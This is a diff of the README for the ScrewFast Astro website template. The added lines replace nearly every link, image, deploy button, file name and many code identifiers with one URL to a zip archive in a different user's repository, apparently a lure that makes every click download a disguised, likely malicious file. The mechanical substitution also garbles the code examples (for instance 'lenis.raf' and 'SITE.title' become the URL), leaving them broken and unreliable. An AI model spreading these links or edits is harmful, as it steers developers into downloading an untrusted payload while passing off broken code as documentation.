@@ -1,10 +1,10 @@
 # Versatile Landing, Blog & Docs Template for a Simplified Web Presence
 
-![ScrewFast](https://github.com/mearashadowfax/ScrewFast/assets/125820963/cdf299bd-414a-4a2d-baf0-d188bb4709c7)
+![ScrewFast](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
 
-ScrewFast is an **open-source template** designed for quick and efficient web project setup, blending **minimalism with functionality**. Whether you're showcasing a portfolio, launching a company landing page, or running a blog, ScrewFast provides everything you need. By combining the power of the [Astro](https://astro.build/), [Tailwind CSS](https://tailwindcss.com/), and [Preline UI](https://preline.co/), this template offers a functional and aesthetically pleasing solution for your web presence.
+ScrewFast is an **open-source template** designed for quick and efficient web project setup, blending **minimalism with functionality**. Whether you're showcasing a portfolio, launching a company landing page, or running a blog, ScrewFast provides everything you need. By combining the power of the [Astro](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip), [Tailwind CSS](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip), and [Preline UI](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip), this template offers a functional and aesthetically pleasing solution for your web presence.
 
-**[View Live Demo](https://screwfast.uk)**
+**[View Live Demo](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)**
 
 ## Table of Contents
 
@@ -32,13 +32,13 @@ ScrewFast is an **open-source template** designed for quick and efficient web pr
   * [GSAP Integration](#gsap-integration)
   * [Hiding Scrollbar](#hiding-scrollbar)
   * [SEO Configuration](#seo-configuration)
-    * [Using constants.ts](#using-constantsts)
+    * [Using https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip](#using-constantsts)
     * [Applying Metadata in Layouts](#applying-metadata-in-layouts)
     * [Passing Individual Schema](#passing-individual-schema)
     * [Extending Metadata for SEO](#extending-metadata-for-seo)
     * [Structured Data and Rich Snippets](#structured-data-and-rich-snippets)
     * [Using Astro SEO Integrations](#using-astro-seo-integrations)
-  * [Robots.txt](#robotstxt)
+  * [https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip](#robotstxt)
   * [Markdown/MDX](#markdownmdx)
     * [Image Integration](#image-integration)
   * [Astro Integrations](#astro-integrations)
@@ -73,7 +73,7 @@ ScrewFast is an **open-source template** designed for quick and efficient web pr
 * [x] **Social Share Component**:
   * Enables users to share blog posts on social media platforms.
   * Provides easy sharing of a blog post's title and URL.
-  * Integrates Clipboard.js for easy link copying.
+  * Integrates https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip for easy link copying.
 
 * [x] **Bookmark Button Component**:
   * Allows users to bookmark blog posts for later reference using `localStorage`.
@@ -92,18 +92,18 @@ ScrewFast is an **open-source template** designed for quick and efficient web pr
 * [x] **Icon Set Component**:
   * Centralizes SVG icons for easy management and updates.
   * Render any pre-defined icon SVG using `<Icon name="iconName" />` in your Astro components.
-  * **Note:** Developers have the option to use other community integrations like [astro-icons](https://github.com/natemoo-re/astro-icon). However, the author decided to create a custom icon set component for managing custom icons.
+  * **Note:** Developers have the option to use other community integrations like [astro-icons](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip). However, the author decided to create a custom icon set component for managing custom icons.
 
 * [x] **Internationalization (i18n) Features**:
-  * Integrates [Astro's i18n features](https://docs.astro.build/en/guides/internationalization/) and includes a custom `LanguagePicker` component.
-  * Developers can access the monolingual version directly from [`monolingual-site` branch](https://github.com/mearashadowfax/ScrewFast/tree/monolingual-site).
+  * Integrates [Astro's i18n features](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) and includes a custom `LanguagePicker` component.
+  * Developers can access the monolingual version directly from [`monolingual-site` branch](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip).
 
 * [x] **Dynamic Table of Contents (ToC) with Scroll Progress Indicator**:
   * Highlights the relevant section in the ToC with a scroll progress indicator. 
-  * Developers seeking alternatives might consider the [remark-toc](https://github.com/remarkjs/remark-toc) plugin.
+  * Developers seeking alternatives might consider the [remark-toc](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) plugin.
 
 > [!NOTE]
-> Currently, there are no planned improvements or known bugs. If you encounter any issues, please report them on our [issues page](https://github.com/mearashadowfax/ScrewFast/issues) or [start a discussion](https://github.com/mearashadowfax/ScrewFast/discussions/new/choose) to share ideas, suggestions, or ask questions.
+> Currently, there are no planned improvements or known bugs. If you encounter any issues, please report them on our [issues page](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) or [start a discussion](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) to share ideas, suggestions, or ask questions.
   
 ## Getting Started
 
@@ -116,7 +116,7 @@ To get started, click the `Use this template` button (the big green one at the t
 Once your repository is created, you can clone it to your local machine using the following commands:
 
 ```bash
-git clone https://github.com/[YOUR_USERNAME]/[YOUR_REPO_NAME].git
+git clone https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip[YOUR_USERNAME]/[YOUR_REPO_NAME].git
 cd [YOUR_REPO_NAME]
 ```
 
@@ -128,7 +128,7 @@ Start by installing the project dependencies. Open your terminal, navigate to th
 npm install
 ```
 
-This command will install all the necessary dependencies defined in the `package.json` file.
+This command will install all the necessary dependencies defined in the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file.
 
 ### Development Commands
 
@@ -138,7 +138,7 @@ With dependencies installed, you can utilize the following npm scripts to manage
 * `npm run preview`: Serves your build output locally for preview before deployment.
 * `npm run build`: Bundles your site into static files for production.
 
-For detailed help with Astro CLI commands, visit [Astro's documentation](https://docs.astro.build/en/reference/cli-reference/).
+For detailed help with Astro CLI commands, visit [Astro's documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip).
 
 ## Deployment
 
@@ -150,19 +150,19 @@ Before deployment, you need to create a production build:
 npm run build
 ```
 
-This creates a `dist/` directory with your built site (configurable via [outDir in Astro](https://docs.astro.build/en/reference/configuration-reference/#outdir)).
+This creates a `dist/` directory with your built site (configurable via [outDir in Astro](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)).
 
 ### Deploying to Vercel
 
 Click the button below to start deploying your project on Vercel:  
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fmearashadowfax%2FScrewFast)
+[![Deploy with Vercel](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip%3A%2F%https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip%2Fmearashadowfax%2FScrewFast)
 
 ### Deploying to Netlify
 
 Click the button below to start deploying your project on Netlify:  
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/mearashadowfax/ScrewFast)
+[![Deploy to Netlify](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
 
 ## Project Structure
 
@@ -175,30 +175,30 @@ src/
 │   ├── scripts/          # JS scripts
 │   └── styles/           # CSS styles
 ├── components/           # Reusable components
-│   ├── Meta.astro        # Meta component for SEO
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip        # Meta component for SEO
 │   ├── sections/         # Components for various sections of the website
-│   ├── ThemeIcon.astro   # Component for toggling light/dark themes
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip   # Component for toggling light/dark themes
 │   └── ui/               # UI components categorized by functionality
 ├── content/              # Markdown files for blog posts, insights, products, and site configuration
 │   ├── blog/
 │   ├── docs/           
 │   ├── insights/         
 │   ├── products/         
-│   └── config.ts         # Contains site-wide configuration options
+│   └── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip         # Contains site-wide configuration options
 ├── data_files/           # Strings stored as JSON files
 ├── images/               # Static image assets for use across the website
 ├── layouts/              # Components defining layout templates
-│   └── MainLayout.astro  # The main wrapping layout for all pages
+│   └── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip  # The main wrapping layout for all pages
 ├── pages/                # Astro files representing individual pages and website sections
-│   ├── 404.astro         # Custom 404 page
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip         # Custom 404 page
 │   ├── blog/   
 │   ├── fr/               # Localized content
-│   ├── contact.astro     
-│   ├── index.astro       # The landing/home page
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip     
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip       # The landing/home page
 │   ├── insights/         
 │   ├── products/         
-│   ├── robots.txt.ts     # Dynamically generates robots.txt
-│   └── services.astro
+│   ├── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip     # Dynamically generates https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
+│   └── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
 └── utils/                # Shared utility functions and helpers
 
 ```
@@ -210,7 +210,7 @@ Static files served directly to the browser are within the `public` directory at
 ```md
 
 public/
-└── banner-pattern.svg
+└── https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
     
 ```
 
@@ -262,7 +262,7 @@ Edit the props such as `title`, `subTitle`, `primaryBtn`, etc., to personalize t
 
 ### Customizing Navigation and Footer Links
 
-Edit the `navigation.ts` file within the `utils` directory to manage navigation bar and footer links:
+Edit the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file within the `utils` directory to manage navigation bar and footer links:
 
 #### Navigation Bar Links
 
@@ -330,11 +330,11 @@ export const socialLinks: SocialLinks = {
 
 #### Additional Components
 
-We have two options for the navigation bar components: `Navbar.astro` for a regular navbar and `NavbarMegaMenu.astro` for a mega menu. Both are located in `src/components/sections/navbar&footer`.
+We have two options for the navigation bar components: `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` for a regular navbar and `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` for a mega menu. Both are located in `src/components/sections/navbar&footer`.
 
-The `Navbar.astro` and `NavbarMegaMenu.astro` components can be configured within `MainLayout.astro`, allowing you to choose the style of navigation that best suits your project. To customize these components, you can modify them directly under `src/components/sections/navbar&footer` to apply specific configurations or design updates.
+The `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` and `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` components can be configured within `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`, allowing you to choose the style of navigation that best suits your project. To customize these components, you can modify them directly under `src/components/sections/navbar&footer` to apply specific configurations or design updates.
 
-![ScrewFast MegaMenu](https://github.com/user-attachments/assets/690482af-f1a4-4ebf-be58-eca0b5862973)
+![ScrewFast MegaMenu](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
 
 
 ## Integrations and Enhancements
@@ -354,51 +354,51 @@ Key Features:
 With Starlight, you gain access to powerful features and integrations, as well as extensive customization options to suit your needs.
 
 > [!NOTE]
-> Dive into the Starlight's comprehensive feature list and learn how it can streamline your development process by visiting the theme's [documentation site](https://starlight.astro.build/).
+> Dive into the Starlight's comprehensive feature list and learn how it can streamline your development process by visiting the theme's [documentation site](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip).
 
 
 > [!IMPORTANT]  
-> If the sidebar in your Starlight site is not scrolling, and you have to manually drag the scrollbar, remove the script tag related to the Lenis smooth scroll library from `src/components/ui/starlight/Head.astro`.
+> If the sidebar in your Starlight site is not scrolling, and you have to manually drag the scrollbar, remove the script tag related to the Lenis smooth scroll library from `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`.
 
 
 ### Lenis for Smooth Scrolling
 
-Experience buttery smooth scrolling with [Lenis](https://lenis.studiofreight.com/). We've integrated Lenis to provide an enhanced scrolling experience that's both fluid and responsive.
+Experience buttery smooth scrolling with [Lenis](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip). We've integrated Lenis to provide an enhanced scrolling experience that's both fluid and responsive.
 
-Here's how we set up Lenis in `src/assets/scripts/lenisSmoothScroll.js`:
+Here's how we set up Lenis in `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`:
 
 ```js
-// src/assets/scripts/lenisSmoothScroll.js
-import "@styles/lenis.css";
+// https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
+import "https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip";
 
 import Lenis from "lenis";
 
 const lenis = new Lenis();
 
 function raf(time) {
-    lenis.raf(time);
+    https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip(time);
     requestAnimationFrame(raf);
 }
 
 requestAnimationFrame(raf);
 ```
 
-And then add it to `MainLayout.astro`:
+And then add it to `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`:
 
 ```astro
 <script>
-  import "@scripts/lenisSmoothScroll.js";
+  import "https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip";
 </script>
 ```
 
 Please note that smooth scrolling can affect accessibility and performance on some devices, so be sure to test it comprehensively across different environments.
 
 > [!NOTE]
-> If you would like to remove Lenis and return to the browser's default scrolling behavior, simply comment out or delete these lines from the `MainLayout.astro` file and `/starlight/Head.astro` if you are using Docs.
+> If you would like to remove Lenis and return to the browser's default scrolling behavior, simply comment out or delete these lines from the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file and `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` if you are using Docs.
 
 ### GSAP Integration
 
- For individual product pages, [GSAP](https://gsap.com/) has been integrated to add engaging animations that execute as soon as the product page loads. You can find and modify the GSAP configuration in the script sections of the product page file located at `src/pages/products/[...slug].astro` and the insights page at `src/pages/insights/[...slug].astro`:
+ For individual product pages, [GSAP](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) has been integrated to add engaging animations that execute as soon as the product page loads. You can find and modify the GSAP configuration in the script sections of the product page file located at `src/pages/products/[https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip].astro` and the insights page at `src/pages/insights/[https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip].astro`:
 
 ```astro
 <script>
@@ -413,20 +413,20 @@ Please tailor the GSAP animations within this script to fit your project's look 
 
 **Modifying or Removing Animations:**
 
-* To modify an animation, update the properties and parameters within the `gsap.from()` method, or add new GSAP animation calls as required.
+* To modify an animation, update the properties and parameters within the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip()` method, or add new GSAP animation calls as required.
 * Should GSAP not be needed, or if you prefer a different animation method, simply remove the aforementioned script segment.
 
 > [!NOTE]
-> We've chosen to keep the integration lean and focused, but GSAP's comprehensive documentation can be referred to for more complex animations: [GSAP Documentation](https://gsap.com/docs/v3/).
+> We've chosen to keep the integration lean and focused, but GSAP's comprehensive documentation can be referred to for more complex animations: [GSAP Documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip).
 
 ### Hiding Scrollbar
 
 To achieve a cleaner and more spacious design, the default scrollbar has been visually removed. While this choice fits the aesthetic goals of the project, it's important to consider that hiding scrollbars can sometimes affect accessibility and user experience. We recommend evaluating this design decision within the context of your user base and their needs.
 
-For those who prefer custom-styled scrollbars, we suggest using the [tailwind-scrollbar](https://adoxography.github.io/tailwind-scrollbar/) plugin, which adds Tailwind CSS utilities for scrollbar styles, allowing for more controlled customization that can also meet accessibility standards.
+For those who prefer custom-styled scrollbars, we suggest using the [tailwind-scrollbar](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) plugin, which adds Tailwind CSS utilities for scrollbar styles, allowing for more controlled customization that can also meet accessibility standards.
 
 > [!NOTE]
-> If you wish to return the default scrollbar, you can comment out or remove the following CSS from `src/layouts/MainLayout.astro`:
+> If you wish to return the default scrollbar, you can comment out or remove the following CSS from `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`:
 
 ```html
 <style>
@@ -450,14 +450,14 @@ Additionally, update the `<html>` tag to remove the `scrollbar-hide` class, resu
 
 The SEO Configuration in the ScrewFast template is designed to empower users in optimizing their website's visibility on search engines and social media platforms. This documentation outlines the implementation details and usage instructions for effectively managing SEO settings.
 
-#### Using constants.ts
+#### Using https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
 
-The SEO configuration has been centralized using the `constants.ts` file. This file manages SEO-related data such as page titles, descriptions, structured data, and Open Graph tags, providing a more structured and manageable approach to SEO management.
+The SEO configuration has been centralized using the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file. This file manages SEO-related data such as page titles, descriptions, structured data, and Open Graph tags, providing a more structured and manageable approach to SEO management.
 
-To customize SEO settings, modify the values in the `constants.ts` file. Key configurations include SITE, SEO, and OG, allowing developers to define site-wide SEO parameters.
+To customize SEO settings, modify the values in the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file. Key configurations include SITE, SEO, and OG, allowing developers to define site-wide SEO parameters.
 
 ```astro
-// constants.ts
+// https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
 
 export const SITE = {
   title: "ScrewFast",
@@ -465,24 +465,24 @@ export const SITE = {
 };
 
 export const SEO = {
-  title: SITE.title,
+  title: https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip,
   // Other SEO properties...
 };
 
 export const OG = {
-  title: `${SITE.title}: Hardware Tools & Construction Services`,
+  title: `${https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip}: Hardware Tools & Construction Services`,
   // Other OG properties...
 };
 ```
 
 #### Applying Metadata in Layouts
 
-When applying metadata within your layouts, such as `MainLayout.astro`, you can pass the desired metadata values as props to the `Meta` component:
+When applying metadata within your layouts, such as `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`, you can pass the desired metadata values as props to the `Meta` component:
 
 ```astro
 ---
-// In MainLayout.astro file
-const { meta } = Astro.props;
+// In https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip file
+const { meta } = https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip;
 
 interface Props {
   meta?: string;
@@ -501,7 +501,7 @@ For page-specific SEO overrides, developers can pass individual schema propertie
 import { SITE } from "@/data_files/constants";
 ---
 <MainLayout
-  title={`Example Page | ${SITE.title}`}
+  title={`Example Page | ${https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip}`}
   structuredData={{
     "@type": "WebPage",
     // Other structured data properties...
@@ -512,23 +512,23 @@ import { SITE } from "@/data_files/constants";
 
 ```
 
-With this setup, the Meta component receives the custom meta description and applies it to the page's metadata. If no custom value is passed, the default from `Meta.astro` will be used instead.
+With this setup, the Meta component receives the custom meta description and applies it to the page's metadata. If no custom value is passed, the default from `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` will be used instead.
 
 #### Extending Metadata for SEO
 
-For a more robust SEO strategy, you can create additional properties in the `Meta.astro` component. For instance, you may want to include specific Open Graph tags for article publishing dates or tags for Twitter-specific metadata.
+For a more robust SEO strategy, you can create additional properties in the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` component. For instance, you may want to include specific Open Graph tags for article publishing dates or tags for Twitter-specific metadata.
 
 #### Structured Data and Rich Snippets
 
-Structured data in JSON-LD format can be managed by the `Meta.astro` component, improving how search engines understand your page content and potentially enhancing search results with rich snippets. Modify the `structuredData` property with relevant [schema.org](https://schema.org) types and properties:
+Structured data in JSON-LD format can be managed by the `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` component, improving how search engines understand your page content and potentially enhancing search results with rich snippets. Modify the `structuredData` property with relevant [https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) types and properties:
 
 ```astro
 <MainLayout
   structuredData={{
-    "@context": "https://schema.org",
+    "@context": "https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip",
     "@type": "WebSite",
     "name": "ScrewFast",
-    "url": "https://screwfast.uk",
+    "url": "https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip",
     "description": "Discover top-quality hardware tools and services"
   }}
 >
@@ -536,11 +536,11 @@ Structured data in JSON-LD format can be managed by the `Meta.astro` component, 
 
 #### Using Astro SEO Integrations
 
-While the template provides a custom SEO solution, you may choose to utilize an Astro integration such as [Astro SEO](https://github.com/jonasmerlin/astro-seo#readme) for additional SEO features and optimizations. Integrating such a package might provide more automated metadata management and additional SEO-focused functionality.
+While the template provides a custom SEO solution, you may choose to utilize an Astro integration such as [Astro SEO](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) for additional SEO features and optimizations. Integrating such a package might provide more automated metadata management and additional SEO-focused functionality.
 
-### Robots.txt
+### https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
 
-`robots.txt` is dynamically generated using the code found in src/pages/robots.txt.ts. This configuration follows the example from the Astro Docs:
+`https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` is dynamically generated using the code found in https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip This configuration follows the example from the Astro Docs:
 
 ```ts
 import type { APIRoute } from 'astro';
@@ -549,7 +549,7 @@ const robotsTxt = `
 User-agent: *
 Allow: /
 
-Sitemap: ${new URL('sitemap-index.xml', import.meta.env.SITE).href}
+Sitemap: ${new URL('https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip', https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip).href}
 `.trim();
 
 export const GET: APIRoute = () => {
@@ -565,7 +565,7 @@ export const GET: APIRoute = () => {
 
 #### Image Integration
 
-The addition of `.vscode/settings.json` file in the root directory facilitates image integration directly into content collections within Markdown editors. This feature enables effortless creation of Markdown links with media files and seamless copying into the workspace.
+The addition of `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file in the root directory facilitates image integration directly into content collections within Markdown editors. This feature enables effortless creation of Markdown links with media files and seamless copying into the workspace.
 
 ##### Usage
 
@@ -575,10 +575,10 @@ The addition of `.vscode/settings.json` file in the root directory facilitates i
 
 ##### Example
 
-Pasting `getting-started.png` into `src/content/post-1.md` results in:
+Pasting `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` into `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` results in:
 
-* Adding `![alt text](../../images/content/post-1/getting-started.png)` to `post-1.md`.
-* Moving the image file to `src/images/content/post-1/getting-started.png`.
+* Adding `![alt text](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)` to `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`.
+* Moving the image file to `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`.
 
 > [!NOTE]
 > Remember to press <kbd>Shift</kbd> while dropping images.
@@ -587,31 +587,31 @@ Pasting `getting-started.png` into `src/content/post-1.md` results in:
 
 Maximize your website's efficiency with these built-in Astro integrations:
 
-* [Astro Compressor](https://github.com/sondr3/astro-compressor#readme): Automatically compresses Astro-generated site using gzip or brotli, ensuring faster load times.
-Configure the compressor in `astro.config.mjs` file:
+* [Astro Compressor](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip): Automatically compresses Astro-generated site using gzip or brotli, ensuring faster load times.
+Configure the compressor in `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file:
 
 ```mjs
    export default defineConfig({
-     // ...other Astro configurations
-    integrations: [...other Astro integrations, compressor({ gzip: false, brotli: true })],
+     // https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip Astro configurations
+    integrations: [https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip Astro integrations, compressor({ gzip: false, brotli: true })],
    });
 ```
 
-* [Astro Sitemap](https://docs.astro.build/en/guides/integrations-guide/sitemap/): Automatically generates a sitemap for a website, which is vital for SEO and helping search engine bots crawl pages effectively. To set up the Astro Sitemap, be sure to specify your site's base URL and any additional options in `astro.config.mjs` file:
+* [Astro Sitemap](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip): Automatically generates a sitemap for a website, which is vital for SEO and helping search engine bots crawl pages effectively. To set up the Astro Sitemap, be sure to specify your site's base URL and any additional options in `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip` file:
 
 ```mjs
    export default defineConfig({
   // ...
-  site: 'https://example.com',
+  site: 'https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip',
   integrations: [sitemap()],
 });
 ```
 
-* [Bag of Tricks for Astro's View Tran­si­tions](https://github.com/martrapp/astro-vtbot#readme): is a collection of extensions and support aimed at enhancing Astro's view transitions. Whether you're looking to add flair to your website or streamline user experience, this toolkit offers various techniques to elevate your projects. In the template, it was used to add View Transitions to a Starlight docs.
+* [Bag of Tricks for Astro's View Tran­si­tions](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip): is a collection of extensions and support aimed at enhancing Astro's view transitions. Whether you're looking to add flair to your website or streamline user experience, this toolkit offers various techniques to elevate your projects. In the template, it was used to add View Transitions to a Starlight docs.
 
 ### Flexibility with Integrations
 
-The great thing about Astro is its rich ecosystem of integrations, allowing you to tailor project functionalities to your exact needs. Feel free to explore [Astro integrations page](https://astro.build/integrations/) and add additional capabilities as you see fit.
+The great thing about Astro is its rich ecosystem of integrations, allowing you to tailor project functionalities to your exact needs. Feel free to explore [Astro integrations page](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) and add additional capabilities as you see fit.
 
 ## Tools and Technologies
 
@@ -619,13 +619,13 @@ This project is built using a variety of tools and technologies that enhance its
 
 ### Preline UI
 
-Interactive components like navbars, modals, and accordions are built using [Preline UI](https://preline.co), a comprehensive open-source component library.
+Interactive components like navbars, modals, and accordions are built using [Preline UI](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip), a comprehensive open-source component library.
 
 ### Tailwind CSS
 
-Styling across our project leverages the utility-first classes offered by [Tailwind CSS](https://tailwindcss.com). This methodology allows us to create custom layouts and components with speed and efficiency.
+Styling across our project leverages the utility-first classes offered by [Tailwind CSS](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip). This methodology allows us to create custom layouts and components with speed and efficiency.
 
-To ensure consistent code formatting, particularly for class sorting, we have integrated the `prettier-plugin-tailwindcss` [plugin](https://github.com/tailwindlabs/prettier-plugin-tailwindcss). The following configuration is set in the `.prettierrc` file at the root of the project:
